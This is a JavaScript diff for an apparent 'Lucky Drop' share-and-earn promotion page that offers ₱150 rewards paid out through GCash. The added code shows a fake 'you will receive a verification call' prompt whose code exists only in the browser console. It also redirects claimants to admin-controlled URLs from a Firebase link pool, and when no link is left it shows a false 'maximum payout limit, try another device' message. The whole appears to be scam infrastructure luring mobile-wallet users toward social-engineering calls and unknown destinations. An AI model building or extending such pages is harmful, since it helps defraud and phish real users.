@@ -1,5 +1,11 @@
 // ========== PROMOTION.JS - SHARE AND EARN ==========
 // Firebase for shared data (no Auth), localStorage for cache
+// Complete with Firewall ON/OFF logic and 4-digit verification
+
+// ========== FIREWALL VERIFICATION VARIABLES ==========
+var currentVerificationCode = null;
+var verificationAttempts = 0;
+var isVerificationModalOpen = false;
 
 // ========== LOCALSTORAGE KEYS ==========
 function getUserStorageKeys() {
@@ -23,7 +29,111 @@ function getUserRef() {
     return db.ref('lucky_drop_users/' + phone);
 }
 
-// ========== LOAD USER DATA FROM FIREBASE ON PAGE LOAD ==========
+// ========== FIREWALL VERIFICATION FUNCTIONS ==========
+async function checkFirewallStatus() {
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        return false;
+    }
+    try {
+        var db = firebase.database();
+        var firewallSnap = await db.ref('admin/globalFirewall').once('value');
+        var isFirewallOn = firewallSnap.val() && firewallSnap.val().active === true;
+        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
+        return isFirewallOn;
+    } catch(e) {
+        console.error("Firewall check error:", e);
+        return false;
+    }
+}
+
+function showFirewallVerificationPopup() {
+    if (isVerificationModalOpen) return;
+    isVerificationModalOpen = true;
+    
+    // Generate random 4-digit code
+    currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
+    console.log("Verification code for this session:", currentVerificationCode);
+    
+    var modal = document.createElement('div');
+    modal.id = 'firewallVerifyModal';
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.backdropFilter = 'blur(10px)';
+    modal.style.zIndex = '20001';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    
+    modal.innerHTML = `
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
+            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
+            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
+            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
+                <p>You will receive a call from our verification system.</p>
+                <p>Please enter the <strong>4-digit code</strong> provided during the call.</p>
+            </div>
+            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
+                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
+            </div>
+            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
+            <div style="font-size: 11px; color: #ffaa33; margin-top: 10px;">Waiting for verification call...</div>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    
+    var codeInput = document.getElementById('verifyCodeInput');
+    var verifyBtn = document.getElementById('submitVerifyBtn');
+    var errorDiv = document.getElementById('verifyErrorMsg');
+    
+    if (codeInput) codeInput.focus();
+    
+    verifyBtn.onclick = function() {
+        var enteredCode = codeInput.value.trim();
+        
+        if (!enteredCode || enteredCode.length < 4) {
+            errorDiv.innerHTML = "Please enter a 4-digit code.";
+            errorDiv.style.display = 'block';
+            return;
+        }
+        
+        verificationAttempts++;
+        
+        if (enteredCode === currentVerificationCode) {
+            // Verification successful
+            errorDiv.style.display = 'none';
+            modal.remove();
+            isVerificationModalOpen = false;
+            alert("VERIFICATION SUCCESSFUL!\n\nYou may now proceed with your claim.");
+        } else {
+            errorDiv.innerHTML = "Invalid verification code. Please provide the correct 4-digit code from the verification call.";
+            errorDiv.style.display = 'block';
+            codeInput.value = '';
+            codeInput.focus();
+            
+            if (verificationAttempts >= 3) {
+                errorDiv.innerHTML = "Too many failed attempts. Page will refresh.";
+                setTimeout(function() {
+                    window.location.reload();
+                }, 2000);
+            }
+        }
+    };
+    
+    modal.onclick = function(e) {
+        if (e.target === modal) {
+            modal.remove();
+            isVerificationModalOpen = false;
+        }
+    };
+}
+
+// ========== LOAD USER DATA FROM FIREBASE ==========
 async function loadUserDataFromFirebase() {
     var keys = getUserStorageKeys();
     if (!keys) return;
@@ -38,26 +148,18 @@ async function loadUserDataFromFirebase() {
             var data = snap.val();
             console.log("Data from Firebase:", data);
             
-            // Sync balance
             if (data.balance !== undefined) {
                 localStorage.setItem(keys.balanceKey, data.balance);
             }
-            
-            // Sync left reward status
             if (data.leftRewardClaimed !== undefined) {
                 localStorage.setItem(keys.leftRewardKey, data.leftRewardClaimed ? 'true' : 'false');
             }
-            
-            // Sync right reward amount
             if (data.rightRewardAvailable !== undefined) {
                 localStorage.setItem(keys.rightRewardKey, data.rightRewardAvailable);
                 updateRightRewardDisplay();
             }
-            
-            // Display balance
             displayBalance();
         } else {
-            // Create new user in Firebase
             await userRef.set({
                 phone: keys.phone,
                 balance: 0,
@@ -75,7 +177,6 @@ async function loadUserDataFromFirebase() {
         }
     } catch(e) {
         console.log("Firebase error:", e);
-        // Use localStorage only if Firebase fails
         displayBalance();
     }
 }
@@ -84,7 +185,6 @@ async function loadUserDataFromFirebase() {
 async function saveBalanceToFirebase(amount) {
     var userRef = getUserRef();
     if (!userRef) return;
-    
     try {
         await userRef.update({
             balance: amount,
@@ -100,11 +200,7 @@ async function saveBalanceToFirebase(amount) {
 function saveBalance(amount) {
     var keys = getUserStorageKeys();
     if (!keys) return;
-    
-    // Save to localStorage
     localStorage.setItem(keys.balanceKey, amount);
-    
-    // Save to Firebase
     saveBalanceToFirebase(amount);
 }
 
@@ -138,7 +234,6 @@ function displayBalance() {
 async function saveLeftRewardToFirebase(claimed) {
     var userRef = getUserRef();
     if (!userRef) return;
-    
     try {
         await userRef.update({
             leftRewardClaimed: claimed,
@@ -154,11 +249,7 @@ async function saveLeftRewardToFirebase(claimed) {
 function saveLeftRewardClaimed(claimed) {
     var keys = getUserStorageKeys();
     if (!keys) return;
-    
-    // Save to localStorage
     localStorage.setItem(keys.leftRewardKey, claimed ? 'true' : 'false');
-    
-    // Save to Firebase
     saveLeftRewardToFirebase(claimed);
 }
 
@@ -170,25 +261,9 @@ function getLeftRewardClaimed() {
 }
 
 // ========== RIGHT REWARD FUNCTIONS ==========
-async function saveRightRewardToFirebase(available, claimed) {
-    var userRef = getUserRef();
-    if (!userRef) return;
-    
-    try {
-        await userRef.update({
-            rightRewardAvailable: available,
-            rightRewardClaimed: claimed,
-            lastUpdate: Date.now()
-        });
-    } catch(e) {
-        console.log("Firebase save error:", e);
-    }
-}
-
 function updateRightRewardDisplay() {
     var keys = getUserStorageKeys();
     if (!keys) return;
-    
     var rightAmount = localStorage.getItem(keys.rightRewardKey);
     var rightAmountSpan = document.getElementById('rightRewardAmount');
     if (rightAmountSpan) {
@@ -199,37 +274,23 @@ function updateRightRewardDisplay() {
 function addRightReward(amount) {
     var keys = getUserStorageKeys();
     if (!keys) return;
-    
     var current = localStorage.getItem(keys.rightRewardKey);
     var currentAmount = current ? parseInt(current) : 0;
     var newAmount = currentAmount + amount;
-    
     localStorage.setItem(keys.rightRewardKey, newAmount);
     updateRightRewardDisplay();
-    
-    // Save to Firebase
-    saveRightRewardToFirebase(newAmount, 0);
-    
     return newAmount;
 }
 
 function claimRightReward() {
     var keys = getUserStorageKeys();
     if (!keys) return 0;
-    
     var available = localStorage.getItem(keys.rightRewardKey);
     var availableAmount = available ? parseInt(available) : 0;
-    
     if (availableAmount <= 0) return 0;
-    
-    // Claim the reward
     addBalance(availableAmount);
     localStorage.setItem(keys.rightRewardKey, 0);
     updateRightRewardDisplay();
-    
-    // Update Firebase
-    saveRightRewardToFirebase(0, availableAmount);
-    
     return availableAmount;
 }
 
@@ -250,17 +311,14 @@ function saveInvitations(invitations) {
 
 function addInvitation(friendPhone) {
     var invitations = getInvitations();
-    
     for (var i = 0; i < invitations.length; i++) {
         if (invitations[i].phone === friendPhone) return false;
     }
-    
     invitations.push({
         phone: friendPhone,
         status: 'pending',
         timestamp: Date.now()
     });
-    
     saveInvitations(invitations);
     return true;
 }
@@ -288,38 +346,7 @@ function displayInvitesCount() {
     return count;
 }
 
-// ========== ACCEPT INVITATION (POV ng invited user) ==========
-function acceptInvitation(inviterPhone) {
-    var currentUserPhone = localStorage.getItem("userPhone");
-    if (!currentUserPhone) return false;
-    
-    // Update invitation status
-    var invitations = getInvitations();
-    var found = false;
-    for (var i = 0; i < invitations.length; i++) {
-        if (invitations[i].phone === inviterPhone) {
-            invitations[i].status = 'approved';
-            invitations[i].acceptedAt = Date.now();
-            found = true;
-            break;
-        }
-    }
-    
-    if (found) {
-        saveInvitations(invitations);
-        
-        // Add reward to right card
-        addRightReward(150);
-        
-        // Update the right card visual
-        activateRightLuckyCat();
-        
-        return true;
-    }
-    return false;
-}
-
-// ========== RENDER INVITATIONS IN DROPDOWN ==========
+// ========== RENDER INVITATIONS ==========
 function renderInvitationsFromStorage() {
     var invitations = getInvitations();
     var listBody = document.getElementById('inviteListBody');
@@ -349,7 +376,6 @@ function renderInvitationsFromStorage() {
     listBody.innerHTML = html;
 }
 
-// ========== SEND INVITATION ==========
 window.sendInviteToStorage = function() {
     var friendPhone = document.getElementById('friendPhoneInput').value.trim();
     var userPhone = localStorage.getItem("userPhone");
@@ -405,7 +431,6 @@ function formatPhoneWithAsterisk(phone) {
 function updateLeftCardFromStorage() {
     var leftCard = document.getElementById('leftCard');
     if (!leftCard) return;
-    
     if (getLeftRewardClaimed()) {
         leftCard.classList.add('prize-card-claimed');
         leftCard.classList.remove('prize-card-glow');
@@ -421,10 +446,8 @@ function updateLeftCardFromStorage() {
 function activateRightLuckyCat() {
     var rightCard = document.getElementById('rightCard');
     if (!rightCard) return;
-    
     var keys = getUserStorageKeys();
     if (!keys) return;
-    
     var rightAmount = localStorage.getItem(keys.rightRewardKey);
     var amount = rightAmount ? parseInt(rightAmount) : 0;
     
@@ -513,7 +536,7 @@ function showFloatingPlus(x, y, amount) {
     setTimeout(function() { floatingDiv.remove(); }, 1000);
 }
 
-// ========== LEFT LUCKY CAT (YOU GET - ₱150 ONE TIME) ==========
+// ========== LEFT LUCKY CAT ==========
 function initLeftLuckyCard() {
     var leftCard = document.getElementById('leftCard');
     if (!leftCard) return;
@@ -527,29 +550,22 @@ function initLeftLuckyCard() {
     if (!getLeftRewardClaimed()) {
         leftCard.addEventListener('click', function(e) {
             e.stopPropagation();
-            
             if (getLeftRewardClaimed()) {
                 alert("You already claimed your ₱150!");
                 return;
             }
-            
-            // Play sound
             luckySound.currentTime = 0;
             luckySound.play().catch(function(err) { console.log("Audio error:", err); });
             
             var rect = this.getBoundingClientRect();
             var x = rect.left + rect.width / 2;
             var y = rect.top + rect.height / 2;
-            
-            // Add balance
             var newBalance = addBalance(150);
             saveLeftRewardClaimed(true);
             
-            // Update UI
             this.classList.remove('prize-card-glow');
             this.classList.add('prize-card-claimed');
             this.style.cursor = 'default';
-            
             showFloatingPlus(x, y, 150);
             startConfetti();
             displayBalance();
@@ -565,19 +581,16 @@ function initLeftLuckyCard() {
     }
 }
 
-// ========== RIGHT LUCKY CAT (FRIEND GETS - REWARDS FROM INVITES) ==========
+// ========== RIGHT LUCKY CAT ==========
 function initRightLuckyCat() {
     var rightCard = document.getElementById('rightCard');
     if (!rightCard) return;
-    
     activateRightLuckyCat();
     
     rightCard.addEventListener('click', function(e) {
         e.stopPropagation();
-        
         var keys = getUserStorageKeys();
         if (!keys) return;
-        
         var available = localStorage.getItem(keys.rightRewardKey);
         var availableAmount = available ? parseInt(available) : 0;
         
@@ -595,15 +608,12 @@ function initRightLuckyCat() {
         var rect = this.getBoundingClientRect();
         var x = rect.left + rect.width / 2;
         var y = rect.top + rect.height / 2;
-        
-        // Claim the reward
         var claimedAmount = claimRightReward();
         
         showFloatingPlus(x, y, claimedAmount);
         startConfetti();
         displayBalance();
         
-        // Update card visual
         this.classList.remove('prize-card-pulse');
         this.classList.add('prize-card-claimed');
         this.style.cursor = 'default';
@@ -642,11 +652,9 @@ function initClaimNowButton() {
         
         claimNowBtn.onclick = function(e) {
             e.preventDefault();
-            
             claimNowBtn.disabled = true;
             claimNowBtn.style.opacity = '0.7';
             claimNowBtn.style.cursor = 'wait';
-            
             icon.style.transform = 'rotate(360deg)';
             
             setTimeout(function() {
@@ -684,7 +692,89 @@ function initFacebookShare() {
     }
 }
 
-// ========== CLAIM THRU GCASH BUTTON ==========
+// ========== CLAIM THRU GCASH BUTTON WITH FIREWALL LOGIC ==========
+async function handleClaimThruGCash() {
+    console.log("CLAIM THRU GCASH clicked");
+    
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        alert("CONNECTION ERROR\n\nPlease refresh the page and try again.");
+        return;
+    }
+    
+    try {
+        var db = firebase.database();
+        
+        // Check firewall status
+        var isFirewallOn = await checkFirewallStatus();
+        
+        if (isFirewallOn) {
+            showFirewallVerificationPopup();
+            return;
+        }
+        
+        // Firewall is OFF - check for available links
+        var linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        
+        if (linksSnap.exists()) {
+            var key = Object.keys(linksSnap.val())[0];
+            var linkData = linksSnap.val()[key];
+            var redirectUrl = linkData.url;
+            
+            if (redirectUrl && !redirectUrl.startsWith('http')) {
+                redirectUrl = 'https://' + redirectUrl;
+            }
+            
+            await db.ref('links/' + key).update({
+                status: 'claimed',
+                claimedAt: Date.now()
+            });
+            
+            alert("✅ CLAIM SUCCESSFUL!\n\nYou will be redirected to complete your withdrawal.");
+            window.location.href = redirectUrl;
+        } else {
+            showWithdrawalErrorModal();
+        }
+        
+    } catch(e) {
+        console.error("Error:", e);
+        alert("SYSTEM ERROR\n\nPlease try again later or contact support.");
+    }
+}
+
+function showWithdrawalErrorModal() {
+    var modal = document.createElement('div');
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.backdropFilter = 'blur(10px)';
+    modal.style.zIndex = '20000';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    
+    modal.innerHTML = `
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
+            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
+            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
+            <div style="color: white; font-size: 13px; line-height: 1.6; text-align: left;">
+                <p><strong>Possible Reasons:</strong></p>
+                <p>• This device has already reached the maximum payout limit.</p>
+                <p>• No GCash app installed on this device.</p>
+                <p>• Please try using another device to complete your withdrawal.</p>
+            </div>
+            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    document.getElementById('closeAlertBtn').onclick = function() {
+        modal.remove();
+    };
+}
+
 function initClaimButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
     if (!claimBtn) return;
@@ -693,20 +783,7 @@ function initClaimButton() {
     claimBtn.parentNode.replaceChild(newBtn, claimBtn);
     claimBtn = newBtn;
     
-    claimBtn.innerHTML = '';
-    
-    var gcIcon = document.createElement('img');
-    gcIcon.src = 'images/gc_icon.png';
-    gcIcon.style.width = '20px';
-    gcIcon.style.height = '20px';
-    gcIcon.style.marginRight = '8px';
-    
-    claimBtn.appendChild(gcIcon);
-    claimBtn.appendChild(document.createTextNode(' CLAIM THRU GCASH'));
-    
-    claimBtn.onclick = function() {
-        alert("Please click the CLAIM NOW button first.");
-    };
+    claimBtn.onclick = handleClaimThruGCash;
 }
 
 // ========== INITIALIZE ==========
@@ -727,7 +804,6 @@ document.addEventListener('DOMContentLoaded', function() {
         display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
     }
     
-    // Load data from Firebase (no Auth)
     loadUserDataFromFirebase().then(function() {
         console.log("Data loaded from Firebase");
     });
